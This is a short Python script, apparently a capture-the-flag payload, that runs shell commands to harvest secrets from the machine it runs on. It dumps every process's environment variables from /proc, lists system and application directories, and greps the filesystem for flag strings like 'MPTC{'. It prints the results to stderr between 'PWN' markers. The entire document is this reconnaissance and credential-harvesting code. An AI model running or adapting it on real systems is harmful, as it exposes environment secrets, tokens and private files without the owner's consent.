import sys, subprocess
cmd = r'''
echo [PROC1ENV]; tr "\0" "\n" < /proc/1/environ 2>/dev/null | grep -iE "flag|mptc|ctf";
echo [ALLPROCENV]; for p in /proc/[0-9]*/environ; do tr "\0" "\n" < $p 2>/dev/null; done | grep -iE "MPTC|FLAG" | sort -u;
echo [LSROOT]; ls -la /;
echo [LSAPP]; ls -la /app /srv /data /opt 2>/dev/null;
echo [APPGREP]; grep -riE "flag|mptc|getenv|environ|open\(" /app 2>/dev/null | head -40;
echo [FINDFLAG]; find / -maxdepth 4 -iname "*flag*" 2>/dev/null | head -50;
echo [GREPFS]; grep -rIl -m5 "MPTC{" /app /srv /data /home /opt /root /etc /tmp /var 2>/dev/null | head;
echo [DONE]
'''
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.stderr.write("\n=====PWN_START=====\n" + r.stdout + r.stderr + "\n=====PWN_END=====\n")
sys.stderr.flush()
raise SystemExit("done")
